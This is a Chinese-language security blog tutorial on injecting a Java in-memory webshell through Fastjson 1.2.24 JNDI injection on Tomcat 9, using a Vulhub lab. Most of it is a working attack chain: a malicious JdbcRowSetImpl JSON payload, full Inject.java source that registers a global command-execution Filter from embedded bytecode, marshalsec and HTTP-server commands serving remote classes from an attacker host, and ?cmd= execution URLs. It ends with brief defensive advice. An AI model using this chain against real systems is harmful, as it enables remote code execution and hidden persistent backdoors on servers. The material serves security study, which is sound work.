---
title: "Java 内存马（六）：JNDI 注入内存马（Fastjson 补充）"
date: "2025-03-24 22:08:00"
updated: "2026-05-30 19:26:15"
categories: ["文章", "代码审计"]
tags: ["Fastjson", "内存马"]
thumbnail: ""
first_image_as_thumbnail: true
excerpt: ""
after_post: ""
comments: true
wp_id: "905"
---
<h2 class="md-end-block md-heading"><span class="md-plain">1. 实战背景与核心场景</span></h2>
<p class="md-end-block md-p"><span class="md-plain">在 JNDI 注入内存马的基础利用中，</span><span class="md-pair-s "><strong><span class="md-plain">Fastjson 反序列化漏洞</span></strong></span><span class="md-plain">是最典型的触发场景之一。Fastjson 作为 Java 生态中常用的 JSON 解析库，其 1.2.24 及以下版本存在反序列化漏洞，攻击者可通过构造恶意 JSON payload，触发 </span><span class="md-pair-s" spellcheck="false"><code>JNDI lookup()</code></span><span class="md-plain"> 方法，进而加载远程恶意类并注入内存马。</span></p>
<p class="md-end-block md-p"><span class="md-plain">实战中需重点解决两大问题：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">容器版本兼容性</span></strong></span><span class="md-plain">：不同 Tomcat 版本（如 Tomcat 8 vs Tomcat 9）获取 </span><span class="md-pair-s" spellcheck="false"><code>StandardContext</code></span><span class="md-plain"> 的方式存在差异，直接影响内存马注册成功率。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">漏洞环境适配</span></strong></span><span class="md-plain">：Vulhub 等公开靶场的 Fastjson 环境可能因依赖版本（如 Tomcat 9）与常规利用代码不兼容，导致注入失败，需针对性调整。</span></p>
</li>
</ul>
<h2 class="md-end-block md-heading"><span class="md-plain">2. Fastjson 漏洞触发 JNDI 注入的原理</span></h2>
<h3 class="md-end-block md-heading"><span class="md-plain">2.1 Fastjson 反序列化漏洞核心逻辑</span></h3>
<p class="md-end-block md-p"><span class="md-plain">Fastjson 支持通过 </span><span class="md-pair-s" spellcheck="false"><code>@type</code></span><span class="md-plain"> 字段指定反序列化的目标类，当目标类存在可被利用的 setter 方法或构造方法时，攻击者可构造恶意 payload 触发代码执行：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">选择 </span><span class="md-pair-s" spellcheck="false"><code>com.sun.rowset.JdbcRowSetImpl</code></span><span class="md-plain"> 作为触发类：该类的 </span><span class="md-pair-s" spellcheck="false"><code>setDataSourceName()</code></span><span class="md-plain"> 方法会将参数赋值给 </span><span class="md-pair-s" spellcheck="false"><code>dataSourceName</code></span><span class="md-plain"> 属性，而 </span><span class="md-pair-s" spellcheck="false"><code>execute()</code></span><span class="md-plain"> 方法会调用 </span><span class="md-pair-s" spellcheck="false"><code>InitialContext.lookup(dataSourceName)</code></span><span class="md-plain">，形成 JNDI 注入链路。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">恶意 JSON payload 格式：</span></p>



```
{
  "@type": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "rmi://攻击端IP:1389/Inject",  // 指向恶意 RMI/LDAP 服务
  "autoCommit": true
}
```


</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">2.2 触发流程拆解</span></h3>
<ol class="ol-list">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">攻击者向 Fastjson 漏洞接口发送上述恶意 JSON payload。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">Fastjson 解析 </span><span class="md-pair-s" spellcheck="false"><code>@type</code></span><span class="md-plain"> 字段，实例化 </span><span class="md-pair-s" spellcheck="false"><code>JdbcRowSetImpl</code></span><span class="md-plain"> 类。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">调用 </span><span class="md-pair-s" spellcheck="false"><code>setDataSourceName()</code></span><span class="md-plain"> 方法，将 </span><span class="md-pair-s" spellcheck="false"><code>dataSourceName</code></span><span class="md-plain"> 设为恶意 RMI/LDAP 地址。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">调用 </span><span class="md-pair-s" spellcheck="false"><code>execute()</code></span><span class="md-plain"> 方法（Fastjson 反序列化过程中自动触发或通过其他逻辑触发），执行 </span><span class="md-pair-s" spellcheck="false"><code>context.lookup(dataSourceName)</code></span><span class="md-plain">。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">受害者服务器加载远程 </span><span class="md-pair-s" spellcheck="false"><code>Inject.class</code></span><span class="md-plain">，触发构造方法中的内存马注册逻辑。</span></p>
</li>
</ol>
<h2 class="md-end-block md-heading"><span class="md-plain">3. 实战痛点：Tomcat 9 容器适配问题</span></h2>
<h3 class="md-end-block md-heading"><span class="md-plain">3.1 常规利用代码在 Tomcat 9 中的失败原因</span></h3>
<p class="md-end-block md-p"><span class="md-plain">在 Tomcat 8 中，可通过 </span><span class="md-pair-s" spellcheck="false"><code>WebappClassLoaderBase.getResources()</code></span><span class="md-plain"> 方法直接获取 </span><span class="md-pair-s" spellcheck="false"><code>StandardRoot</code></span><span class="md-plain">，进而拿到 </span><span class="md-pair-s" spellcheck="false"><code>StandardContext</code></span><span class="md-plain">：</span></p>



```
// Tomcat 8 及以下获取 StandardContext 的常规代码（Tomcat 9 中失效）
WebappClassLoaderBase classLoader = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
StandardRoot standardRoot = (StandardRoot) classLoader.getResources(); // Tomcat 9 中此方法返回 null
StandardContext context = (StandardContext) standardRoot.getContext();
```


<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">问题根源</span></strong></span><span class="md-plain">：Tomcat 9 对 </span><span class="md-pair-s" spellcheck="false"><code>WebappClassLoaderBase</code></span><span class="md-plain"> 类进行了重构，</span><span class="md-pair-s" spellcheck="false"><code>getResources()</code></span><span class="md-plain"> 方法被标记为 </span><span class="md-pair-s "><strong><span class="md-plain">弃用</span></strong></span><span class="md-plain">，且内部实现返回 </span><span class="md-pair-s" spellcheck="false"><code>null</code></span><span class="md-plain">，导致上述代码抛出空指针异常（NPE）。</span></p>

<h3 class="md-end-block md-heading"><span class="md-plain">3.2 Tomcat 9 适配方案：反射获取 </span><span class="md-pair-s" spellcheck="false"><code>resources</code></span><span class="md-plain"> 字段</span></h3>
<p class="md-end-block md-p"><span class="md-plain">Tomcat 9 的 </span><span class="md-pair-s" spellcheck="false"><code>WebappClassLoaderBase</code></span><span class="md-plain"> 类中仍保留 </span><span class="md-pair-s" spellcheck="false"><code>resources</code></span><span class="md-plain"> 属性（类型为 </span><span class="md-pair-s" spellcheck="false"><code>StandardRoot</code></span><span class="md-plain">），但访问权限为 </span><span class="md-pair-s" spellcheck="false"><code>protected</code></span><span class="md-plain">，需通过反射突破访问限制：</span></p>



```
// Tomcat 9 中获取 StandardContext 的正确代码
public StandardContext getTomcat9Context() throws Exception {
    // 1. 获取当前线程的 Web 应用类加载器
    WebappClassLoaderBase classLoader = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
    
    // 2. 反射获取 WebappClassLoaderBase 中的 "resources" 字段
    Field resourcesField = WebappClassLoaderBase.class.getDeclaredField("resources");
    resourcesField.setAccessible(true); // 突破 protected 访问限制
    
    // 3. 从字段中获取 StandardRoot 实例
    StandardRoot standardRoot = (StandardRoot) resourcesField.get(classLoader);
    
    // 4. 从 StandardRoot 获取 StandardContext
    return (StandardContext) standardRoot.getContext();
}
```


<p class="md-end-block md-p"><span class="md-plain">此方案通过直接操作类属性，绕过了失效的 </span><span class="md-pair-s" spellcheck="false"><code>getResources()</code></span><span class="md-plain"> 方法，适配 Tomcat 9 环境。</span></p>

<h2 class="md-end-block md-heading"><span class="md-plain">4. Fastjson 实战：完整注入流程（Tomcat 9 环境）</span></h2>
<p class="md-end-block md-p"><span class="md-plain">以 Vulhub 的 Fastjson 1.2.24 靶场（Tomcat 9 容器）为例，详细说明注入步骤：</span></p>

<h3 class="md-end-block md-heading"><span class="md-plain">4.1 环境准备</span></h3>
<figure class="md-table-fig table-figure">
<table class="md-table">
<thead>
<tr class="md-end-block">
<th><span class="td-span"><span class="md-plain">角色</span></span></th>
<th><span class="td-span"><span class="md-plain">工具 / 环境</span></span></th>
<th><span class="td-span"><span class="md-plain">说明</span></span></th>
</tr>
</thead>
<tbody>
<tr class="md-end-block">
<td><span class="td-span"><span class="md-plain">攻击端</span></span></td>
<td><span class="td-span"><span class="md-plain">JDK 8u62</span></span></td>
<td><span class="td-span"><span class="md-plain">低版本 JDK，确保 </span><span class="md-pair-s" spellcheck="false"><code>trustURLCodebase=true</code></span><span class="md-plain">，支持远程类加载</span></span></td>
</tr>
<tr class="md-end-block">
<td><span class="td-span"><span class="md-plain">攻击端</span></span></td>
<td><span class="td-span"><span class="md-plain">marshalsec</span></span></td>
<td><span class="td-span"><span class="md-plain">启动 RMI/LDAP 服务，生成 JNDI 引用</span></span></td>
</tr>
<tr class="md-end-block">
<td><span class="td-span"><span class="md-plain">攻击端</span></span></td>
<td><span class="td-span"><span class="md-plain">Python HTTP 服务</span></span></td>
<td><span class="td-span"><span class="md-plain">托管恶意 </span><span class="md-pair-s" spellcheck="false"><code>Inject.class</code></span></span></td>
</tr>
<tr class="md-end-block">
<td><span class="td-span"><span class="md-plain">受害者</span></span></td>
<td><span class="td-span"><span class="md-plain">Vulhub Fastjson 1.2.24</span></span></td>
<td><span class="td-span"><span class="md-plain">Tomcat 9 容器，存在 Fastjson 反序列化漏洞</span></span></td>
</tr>
</tbody>
</table>
</figure>
<h3 class="md-end-block md-heading"><span class="md-plain">4.2 步骤 1：编写适配 Tomcat 9 的恶意注入类（Inject.java）</span></h3>
<p class="md-end-block md-p"><span class="md-plain">核心调整：使用反射获取 </span><span class="md-pair-s" spellcheck="false"><code>resources</code></span><span class="md-plain"> 字段，适配 Tomcat 9；内置 Base64 编码的 Filter 字节码，避免多文件依赖。</span></p>



```
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.catalina.webresources.StandardRoot;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;
import sun.misc.BASE64Decoder;
import javax.servlet.http.HttpFilter;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
​
public class Inject {
    // 构造方法：自动执行内存马注册逻辑
    public Inject() {
        try {
            // 1. 适配 Tomcat 9：反射获取 StandardContext
            WebappClassLoaderBase classLoader = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            Field resourcesField = WebappClassLoaderBase.class.getDeclaredField("resources");
            resourcesField.setAccessible(true);
            StandardRoot standardRoot = (StandardRoot) resourcesField.get(classLoader);
            StandardContext context = (StandardContext) standardRoot.getContext();
​
            // 2. Base64 解码 ShellFilter 字节码（替换为实际生成的编码）
            String filterBase64 = "yv66vgAAADQAWQoADwAvCAAlCwAwADEKADIAMwoAMgA0BwA1BwA2CgA3ADgKAAcAOQoABgA6CgAGADsL...";
            BASE64Decoder decoder = new BASE64Decoder();
            byte[] filterBytes = decoder.decodeBuffer(filterBase64);
​
            // 3. 反射加载 ShellFilter 类
            ClassLoader webClassLoader = Thread.currentThread().getContextClassLoader();
            Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClassMethod.setAccessible(true);
            Class<?> filterClass = (Class<?>) defineClassMethod.invoke(webClassLoader, filterBytes, 0, filterBytes.length);
​
            // 4. 实例化 Filter 并注册到容器
            HttpFilter shellFilter = (HttpFilter) filterClass.newInstance();
            // 4.1 创建 Filter 定义
            FilterDef filterDef = new FilterDef();
            filterDef.setFilterName("fastjson-shell-filter");
            filterDef.setFilter(shellFilter);
            filterDef.setFilterClass(filterClass.getName());
            // 4.2 创建 Filter 映射（全局匹配）
            FilterMap filterMap = new FilterMap();
            filterMap.setFilterName("fastjson-shell-filter");
            filterMap.addURLPattern("/*");
            // 4.3 注册到 StandardContext
            context.addFilterDef(filterDef);
            context.addFilterMapBefore(filterMap);
            context.filterStart(); // 激活 Filter
​
            System.out.println("Fastjson 触发 JNDI 注入内存马成功！");
       } catch (Exception e) {
            System.err.println("注入失败：" + e.getMessage());
            e.printStackTrace();
       }
   }
}
```


<h3 class="md-end-block md-heading"><span class="md-plain">4.3 步骤 2：生成 ShellFilter 字节码的 Base64 编码</span></h3>
<p class="md-end-block md-p"><span class="md-plain">与基础 JNDI 注入流程一致，使用 </span><span class="md-pair-s" spellcheck="false"><code>javassist</code></span><span class="md-plain"> 将 </span><span class="md-pair-s" spellcheck="false"><code>ShellFilter</code></span><span class="md-plain"> 类转为 Base64 编码，嵌入 </span><span class="md-pair-s" spellcheck="false"><code>Inject</code></span><span class="md-plain"> 类的 </span><span class="md-pair-s" spellcheck="false"><code>filterBase64</code></span><span class="md-plain"> 变量中，确保无外部文件依赖。</span></p>

<h3 class="md-end-block md-heading"><span class="md-plain">4.4 步骤 3：攻击端搭建服务</span></h3>
<h4 class="md-end-block md-heading"><span class="md-plain">4.4.1 编译 Inject 类</span></h4>
<p class="md-end-block md-p"><span class="md-plain">使用 JDK 8u62 编译，需引入 Tomcat 9 核心依赖（</span><span class="md-pair-s" spellcheck="false"><code>tomcat-catalina-9.0.97.jar</code></span><span class="md-plain">）与 Servlet API：</span></p>



```
javac -cp "tomcat-catalina-9.0.97.jar:javax.servlet-api-4.0.1.jar" Inject.java
```


<h4 class="md-end-block md-heading"><span class="md-plain">4.4.2 启动 HTTP 服务器</span></h4>
<p class="md-end-block md-p"><span class="md-plain">将编译后的 </span><span class="md-pair-s" spellcheck="false"><code>Inject.class</code></span><span class="md-plain"> 放入 HTTP 服务根目录，使用 Python 快速启动：</span></p>



```
# 进入 Inject.class 所在目录，启动 80 端口 HTTP 服务
python -m http.server 80
```


<h4 class="md-end-block md-heading"><span class="md-plain">4.4.3 启动 RMI 服务</span></h4>
<p class="md-end-block md-p"><span class="md-plain">使用 </span><span class="md-pair-s" spellcheck="false"><code>marshalsec</code></span><span class="md-plain"> 工具启动 RMI 服务，将引用指向 HTTP 服务器的 </span><span class="md-pair-s" spellcheck="false"><code>Inject.class</code></span><span class="md-plain">：</span></p>



```
# 格式：java -cp marshalsec.jar marshalsec.jndi.RMIRefServer "http://攻击端IP/#Inject" RMI端口
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://192.168.100.1/#Inject" 1389
```


<h3 class="md-end-block md-heading"><span class="md-plain">4.5 步骤 4：触发 Fastjson 漏洞并注入内存马</span></h3>
<h4 class="md-end-block md-heading"><span class="md-plain">4.5.1 启动 Vulhub Fastjson 靶场</span></h4>


```
# 进入 Vulhub Fastjson 1.2.24 目录，启动容器
cd vulhub/fastjson/1.2.24-rce
sudo docker-compose up -d
```


<h4 class="md-end-block md-heading"><span class="md-plain">4.5.2 发送恶意 JSON payload</span></h4>
<p class="md-end-block md-p"><span class="md-plain">通过 POST 请求向靶场漏洞接口（如 </span><span class="md-pair-s" spellcheck="false"><code>http://受害者IP:8090/</code></span><span class="md-plain">）发送 JSON payload，触发 JNDI 注入：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">请求方法：POST</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">Content-Type：</span><span class="md-pair-s" spellcheck="false"><code>application/json</code></span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">请求体：</span></p>



```
{
  "@type": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "rmi://192.168.100.1:1389/Inject",
  "autoCommit": true
}
```


</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">工具：可使用 Burp Suite、Postman 或 curl 发送请求。</span></p>
</li>
</ul>
<h4 class="md-end-block md-heading"><span class="md-plain">4.5.3 验证内存马</span></h4>
<p class="md-end-block md-p"><span class="md-plain">注入成功后，通过任意请求携带 </span><span class="md-pair-s" spellcheck="false"><code>cmd</code></span><span class="md-plain"> 参数即可执行命令（Filter 全局生效）：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">执行 </span><span class="md-pair-s" spellcheck="false"><code>ls</code></span><span class="md-plain">（Linux）：</span><span class="md-pair-s" spellcheck="false"><code>http://受害者IP:8090/?cmd=ls</code></span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">执行 </span><span class="md-pair-s" spellcheck="false"><code>whoami</code></span><span class="md-plain">：</span><span class="md-pair-s" spellcheck="false"><code>http://受害者IP:8090/任意路径?cmd=whoami</code></span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">响应结果：页面返回命令执行输出（如目录列表、当前用户）。</span></p>
</li>
</ul>
<h2 class="md-end-block md-heading"><span class="md-plain">5. 实战常见问题与解决方案</span></h2>
<figure class="md-table-fig table-figure">
<table class="md-table">
<thead>
<tr class="md-end-block">
<th><span class="td-span"><span class="md-plain">问题现象</span></span></th>
<th><span class="td-span"><span class="md-plain">原因分析</span></span></th>
<th><span class="td-span"><span class="md-plain">解决方案</span></span></th>
</tr>
</thead>
<tbody>
<tr class="md-end-block">
<td><span class="td-span"><span class="md-plain">注入时抛出空指针异常（NPE）</span></span></td>
<td><span class="td-span"><span class="md-plain">Tomcat 9 中 </span><span class="md-pair-s" spellcheck="false"><code>WebappClassLoaderBase.getResources()</code></span><span class="md-plain"> 返回 null</span></span></td>
<td><span class="td-span"><span class="md-plain">改用反射获取 </span><span class="md-pair-s" spellcheck="false"><code>resources</code></span><span class="md-plain"> 字段，而非调用失效方法</span></span></td>
</tr>
<tr class="md-end-block">
<td><span class="td-span"><span class="md-plain">JNDI 无法加载远程类</span></span></td>
<td><span class="td-span"><span class="md-plain">1. JDK 版本过高（8u191+），</span><span class="md-pair-s" spellcheck="false"><code>trustURLCodebase=false</code></span><span class="md-plain">；2. 远程类路径错误</span></span></td>
<td><span class="td-span"><span class="md-plain">1. 使用 JDK 8u191 以下版本；2. 检查 HTTP 服务地址与 </span><span class="md-pair-s" spellcheck="false"><code>Inject.class</code></span><span class="md-plain"> 路径</span></span></td>
</tr>
<tr class="md-end-block">
<td><span class="td-span"><span class="md-plain">命令执行无响应</span></span></td>
<td><span class="td-span"><span class="md-plain">1. Filter 注册失败；2. 命令执行结果编码异常（如 Windows 中文乱码）</span></span></td>
<td><span class="td-span"><span class="md-plain">1. 检查 </span><span class="md-pair-s" spellcheck="false"><code>Inject</code></span><span class="md-plain"> 类中 </span><span class="md-pair-s" spellcheck="false"><code>filterStart()</code></span><span class="md-plain"> 是否调用；2. 命令执行时指定编码（如 </span><span class="md-pair-s" spellcheck="false"><code>GBK</code></span><span class="md-plain">）</span></span></td>
</tr>
<tr class="md-end-block">
<td><span class="td-span"><span class="md-plain">Fastjson 解析报错</span></span></td>
<td><span class="td-span"><span class="md-plain">payload 格式错误（如 </span><span class="md-pair-s" spellcheck="false"><code>@type</code></span><span class="md-plain"> 字段拼写错误、JSON 语法错误）</span></span></td>
<td><span class="td-span"><span class="md-plain">验证 JSON 格式，确保 </span><span class="md-pair-s" spellcheck="false"><code>@type</code></span><span class="md-plain"> 字段为 </span><span class="md-pair-s" spellcheck="false"><code>com.sun.rowset.JdbcRowSetImpl</code></span></span></td>
</tr>
</tbody>
</table>
</figure>
<h2 class="md-end-block md-heading"><span class="md-plain">6. 实战总结与防御建议</span></h2>
<h3 class="md-end-block md-heading"><span class="md-plain">6.1 实战核心要点</span></h3>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">容器版本适配</span></strong></span><span class="md-plain">：Tomcat 8 与 Tomcat 9 获取 </span><span class="md-pair-s" spellcheck="false"><code>StandardContext</code></span><span class="md-plain"> 的方式差异是实战成败关键，需通过反射灵活适配。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">单一文件依赖</span></strong></span><span class="md-plain">：将 Filter 字节码以 Base64 形式嵌入 </span><span class="md-pair-s" spellcheck="false"><code>Inject</code></span><span class="md-plain"> 类，避免多文件依赖导致的加载失败。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">服务链路验证</span></strong></span><span class="md-plain">：注入前需确认 HTTP 服务、RMI 服务可正常访问，避免因网络问题导致远程类加载失败。</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">6.2 防御建议</span></h3>
<ol class="ol-list">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">升级 Fastjson 版本</span></strong></span><span class="md-plain">：将 Fastjson 升级至 1.2.83 及以上，修复反序列化漏洞。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s"><strong><span class="md-plain">限制 JNDI 远程类加载</span></strong></span><span class="md-plain">：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">升级 JDK 至 8u191+、7u201+，默认关闭 </span><span class="md-pair-s" spellcheck="false"><code>trustURLCodebase</code></span><span class="md-plain">。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">通过 JVM 参数 </span><span class="md-pair-s" spellcheck="false"><code>-Dcom.sun.jndi.ldap.object.trustURLCodebase=false</code></span><span class="md-plain"> 禁用远程类加载。</span></p>
</li>
</ul>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s"><strong><span class="md-plain">监控异常请求</span></strong></span><span class="md-plain">：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">拦截含 </span><span class="md-pair-s" spellcheck="false"><code>@type: com.sun.rowset.JdbcRowSetImpl</code></span><span class="md-plain"> 的恶意 JSON payload。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">监控异常的 RMI/LDAP 连接（如非业务需求的外部 JNDI 服务访问）。</span></p>
</li>
</ul>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s"><strong><span class="md-plain">容器安全加固</span></strong></span><span class="md-plain">：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">限制 Tomcat 应用的反射权限，禁止非必要的 </span><span class="md-pair-s" spellcheck="false"><code>Field.setAccessible(true)</code></span><span class="md-plain"> 操作。</span></p>
</li>
 	<li class="md-list-item md-focus-container">
<p class="md-end-block md-p md-focus"><span class="md-plain">定期检查 </span><span class="md-pair-s" spellcheck="false"><code>StandardContext</code></span><span class="md-plain md-expand"> 中的 Filter/Servlet 列表，发现未知组件及时清理。</span></p>
</li>
</ul>
</li>
</ol>
